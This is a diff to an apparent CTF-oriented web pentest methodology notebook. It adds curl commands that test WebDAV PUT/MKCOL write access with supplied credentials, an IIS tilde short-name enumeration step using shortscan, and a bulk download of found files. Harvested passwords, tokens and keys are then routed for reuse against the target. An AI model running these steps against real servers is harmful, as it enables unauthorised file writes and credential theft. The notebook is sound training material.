@@ -95,7 +95,10 @@ Runs when `creds_<host>.txt` has entries not present in `creds_<host>.txt.walked
 
 Actions (both fire per new cred):
 
-1. Deferred write retry requiring authentication. `grep 'WRITE_.*_NEEDS_AUTH' route_<ip>.txt` → for each `<dir>`, retry [[#Step 4 — Server capability probing]] authenticated. Retry must branch on `WWW-Authenticate` scheme: Basic → `-u`, NTLM → `--ntlm -u`, cookie-based → `-b`. 
+1. Deferred write retry requiring authentication. `grep 'WRITE_.*_NEEDS_AUTH' route_<ip>.txt` → for each `<dir>`| `<auth_method>`, retry [[#Step 4 — Server capability probing]] authenticated. Retry must branch on `WWW-Authenticate` scheme — single-quote the credential: 
+	- Basic → curl `-u '<user>:<pass>'` 
+	- cookie-based → curl `-b '<cookie>'` 
+	- NTLM → curl-ntlm `--ntlm -u '<user>:<pass>'` (ring-fenced binary; full command in Step 4).
 2. [[Authenticated Walk]]
 
 Mark **all** newly-walked entries:
@@ -106,7 +109,7 @@ Mark **all** newly-walked entries:
 
 Runs when `unauth_paths_<host>.txt` has entries not present in `unauth_paths_<host>.txt.walked`:
 
-`comm -23 <(sort -u unauth_paths_<host>.txt) <(sort -u unauth_paths_<host>.txt.walked 2>/dev/null)`
+`comm -23 <(sort -u unauth_paths_$host.txt) <(sort -u unauth_paths_$host.txt.walked 2>/dev/null)`
 
 For each unwalked path `<p>`:
 
@@ -308,14 +311,23 @@ Output table is `dir|allow|dav`.
 
 ### 4.3 Process the methods table:
 
-###### `grep` for `PUT`, `MKCOL` and `DAV` (write candidates)
+#### `grep` for `PUT`, `MKCOL` and `DAV` (write candidates)
 
 `grep -E 'PUT|MKCOL|DAV' methods_$host.txt > method_write_candidates.txt`
-###### Confirm `PUT` capability:
+#### i. Confirm `PUT` capability:
 
-For each dir advertising `PUT` (`cat method_write_candidates.txt | grep "PUT"`) confirm capability: 
+For each dir advertising `PUT` (`cat method_write_candidates.txt | grep "PUT"`) confirm capability, using whichever tool (`curl` OR `python3`) is appropriate to the Authentication Method: 
+###### Use the below `curl` command for: `Unauthenticated`, Auth method `BASIC`, Auth method `Cookie-based` and Auth method `Session-based`
 
-`curl -s -D - -o /dev/null -w '%{http_code}\n' -X PUT --data test "http://$host:$port<dir>/wac.txt"`
+`curl [-u '<user>:<pass>' | -b '<cookie>'] -s -D - -o /dev/null -w '%{http_code}\n' -X PUT --data test "http://$host:$port<dir>/wac.txt"`
+
+###### Use the below `curl-ntlm` command for Auth method `NTLM`
+
+`~/tools/curl-ntlm/bin/curl --ntlm -u '<user>:<pass>' -s -D - -o /dev/null -w '%{http_code}\n' -X PUT --data test "http://$host:$port<dir>/wac.txt"`
+
+Ring-fenced NTLM-capable `curl` per [[Attacker Toolchain]] (stock Kali `curl` has NTLM stripped).
+
+###### Process each response: 
 
 - `401` → writable with auth. Record in `route_<ip>.txt` → `DEFERRED: WRITE_PUT_NEEDS_AUTH: <dir> | WWW-Authenticate: <auth_method>`
 - `201`/`200` → writable. GET it back to confirm (`curl -s "http://$host:$port<dir>/wac.txt"`), then → [[File Upload]] `Write via HTTP method`, `<put_dir>` = `<dir>`.
@@ -323,11 +335,20 @@ For each dir advertising `PUT` (`cat method_write_candidates.txt | grep "PUT"`) 
 
 ⚠️ Writes a file to the target. Real engagement: scope first; `curl -X DELETE` to clean up.
 
-###### Confirm `MKCOL` capability:
+#### ii. Confirm `MKCOL` capability:
  
-For each dir advertising `MKCOL` (`cat method_write_candidates.txt | grep "MKCOL"`) confirm capability: 
+For each dir advertising `MKCOL` (`cat method_write_candidates.txt | grep "MKCOL"`) confirm capability, using whichever tool (`curl` OR `python3`) is appropriate to the Authentication Method: 
+###### Use the below `curl` command for: `Unauthenticated`, Auth method `BASIC`, Auth method `Cookie-based` and Auth method `Session-based`
 
-`curl -s -D - -o /dev/null -w '%{http_code}\n' -X MKCOL "http://$host:$port<dir>/wac_TEST/"`
+`curl [-u '<user>:<pass>' | -b '<cookie>'] -s -D - -o /dev/null -w '%{http_code}\n' -X MKCOL "http://$host:$port<dir>/wac_TEST/"`
+
+###### Use the below `curl-ntlm` command for Auth method `NTLM`
+
+`~/tools/curl-ntlm/bin/curl --ntlm -u '<user>:<pass>' -s -D - -o /dev/null -w '%{http_code}\n' -X MKCOL "http://$host:$port<dir>/wac_TEST/"`
+
+Ring-fenced NTLM-capable `curl` per [[Attacker Toolchain]] (stock Kali `curl` has NTLM stripped).
+
+###### Process each response: 
 
 - `401` → writable with auth. Record in `route_<ip>.txt` → `DEFERRED: WRITE_MKCOL_NEEDS_AUTH: <dir> | WWW-Authenticate: <auth_method>`
 - `201`/`200` → directory created. PUT into it to confirm file write:
@@ -971,6 +992,74 @@ Run **after 8.1** so `--paths` consumes the directories 8.1 discovered.
 - `ARCHIVE_UNCONFIRMED: <url> (200, …)` — 200 but identity not confirmable (generic `octet-stream`, or no magic / not HTML / not SQL). Eyeball manually: `curl -s -r 0-63 "<url>" | xxd | head`. Real archive → treat as `ARCHIVE_FOUND`; otherwise drop.
 - `NO_ARCHIVES_CONFIRMED: <target>` 
 - `SCAN COMPLETE: <N> probed, <c> confirmed, <u> unconfirmed, <r> restricted, <s> soft-404 suppressed, <m> not-found` (+ `, <e> errored` when any probe got no response) — positive scan-completion confirmation. A clean no-hit run is explicit, never a silent prompt-return.
+
+### 8.4 IIS short-name (tilde) enumeration
+
+> **STATUS: FORMAT-ONLY** — built 2026-10-19 (THM `Web Server Attacks - II` Task 3). shortscan v0.9.2 invocation + JSON output contract live-verified on the room box; jq parse sandbox-verified. Routing derived, not walked end-to-end; not first-principles audited. Not CANONICAL.
+
+⚠️ **IIS-only. Run only if target fingerprinted `microsoft-iis`; otherwise skip to the Step 8 boundary.**
+
+Assumes attacker environment per [[Attacker Toolchain]] (`shortscan` is non-stock).
+#### Run
+
+`shortscan --output json http://$host:$port/ > shortscan_${ip}_$port.json`
+
+TLS service → `https://$host:$port/`.
+
+#### Completion check — run before processing:
+
+`jq -e 'select(.type=="statistics")' shortscan_${ip}_$port.json >/dev/null && echo "SHORTSCAN_COMPLETE" || echo "SHORTSCAN_INCOMPLETE"`
+
+- `SHORTSCAN_INCOMPLETE` → scan did not finish (box unreachable / killed mid-run) → rerun the Run command.
+- `SHORTSCAN_COMPLETE` → proceed.
+
+#### Vuln gate:
+
+`jq -e 'select(.type=="status" and .vulnerable==true)' shortscan_${ip}_$port.json >/dev/null && echo "VULN" || echo "NOT_VULN"`
+
+- `NOT_VULN` → 8.3 name creation disabled / not tilde-vulnerable → `echo 'INAPPLICABLE: iis-shortname' >> route_<ip>.txt`, skip to the Step 8 boundary.
+- `VULN` → proceed.
+
+#### Resolved names → paths:
+
+`jq -r 'select(.type=="result" and .fullmatch==true) | (.baseurl | sub("^https?://[^/]+";"")) + .fullname' shortscan_${ip}_$port.json`
+
+Each line is a confirmed path → add each path to `unauth_paths_$host.txt` AND add each path to `shortscan_hits_${ip}_$port.txt`
+
+#### Unresolved short names → review:
+
+`jq -r 'select(.type=="result" and .fullmatch==false) | "TILDE_UNRESOLVED: \(.baseurl) \(.shortfile)\(.shorttilde)\(.shortext) (\(.partname))"' shortscan_${ip}_$port.json`
+
+Each line is a confirmed-existing resource whose long name shortscan could not recover — a 6-char name prefix + 3-char extension prefix, **not a fetchable path**. Per entry, in order:
+
+1. GET the containing directory (`<baseurl>`): `curl -s "<baseurl>"`. Directory listing returned → read the real filenames → add each `<full_path>` to `unauth_paths_$host.txt` AND add each `<full_path>` to `shortscan_hits_${ip}_$port.txt`
+2. No listing → informed guess from the prefix (extension prefix → full extension, e.g. `WEB~1.CON` → `.CON` = `.config` → try `/web.config`); confirm with `curl -s -o /dev/null -w '%{http_code}\n' "http://$host:$port<guess>"`. Non-404 → add `<guess>` to `unauth_paths_$host.txt` AND `shortscan_hits_${ip}_$port.txt`. Worth-it only for high-value prefixes (`CONFIG`, `BACKUP`, `ADMIN`, `WEB`); skip noise.
+3. Neither resolves, prefix worth revisiting → `echo 'TILDE_UNRESOLVED: <baseurl><partname>' >> route_<ip>.txt` as a lead.
+
+#### File content harvest:
+
+⚠️ No confirmed paths (`shortscan_hits_${ip}_$port.txt` empty / absent) → skip to boundary check.
+
+Create the local inspection dir:
+
+`mkdir -p inspect_shortscan_${host}_$port`
+
+`grep -vE '\.(html?|png|jpe?g|gif|svg|ico|webp|bmp|tiff?|avif|css|woff2?|ttf|otf|eot|mp[34]|m4[av]|webm|wav|ogg|oga|flac|aac|avi|mov|mkv|wmv|flv)$|/$' shortscan_hits_${ip}_$port.txt | while read -r p; do curl -s -L -O --output-dir inspect_shortscan_${host}_$port "http://$host:$port$p"; done`
+
+Inspect the tree:
+
+`~/scripts/local_file_inspector.py inspect_shortscan_${host}_$port`
+
+Route per marker:
+
+- `FILE_CRED: <path>: <match>` — verify (may be a placeholder like `changeme` / `<PASSWORD>`); real credential → `echo '<user>:<pass>' >> creds_<host>.txt`; log `echo 'FILE_CRED: <path>: <match>' >> route_<ip>.txt`.
+- `SECRET: <path>: <type>:<value>` — route by `<type>`: `jwt` → [[Session Cookie Attacks]] (JWT branch); `bearer` / `token` → reuse as an `Authorization` header on auth-gated requests; `aws_akid` / `api_key` / `google_api_key` / `slack_token` / `pem_private_key` / `secret` → note for the matching service, reuse when that service surfaces. Log to `route_<ip>.txt`.
+- `ENDPOINT_REF: <path>: <ref>` — new attack surface → `echo '<ref>' >> unauth_paths_<host>.txt` (re-fire drains at the Step 8 boundary). A `${...}` / `:param` stub is a 8.2(f) segment-swap template, not a literal probe.
+- `ARCHIVE_NESTED: <path>` — the retrieved file is itself an archive → 8.3 loot: extract to a sandbox dir, then re-run the inspector over the extracted tree.
+- `MANUAL_REVIEW: <path>` — file read OK; eyeball the local copy at `inspect_shortscan_${host}_$port/…` for what the regexes do not catch (stack traces, framework hints, usernames, source disclosure in `.bak` / `.old` / `.orig` / `~`).
+- `FLAG: <path>: <value>` — CTF flag.
+- `READ_FAIL: <path>: <reason>` — retrieval or read failed; NOT a no-match. Re-fetch manually if the hit looked live.
+- `SCAN COMPLETE: …` — positive completion; a clean no-finding run is explicit, never a silent return.
 
 ## — Boundary — end of Step 8
 
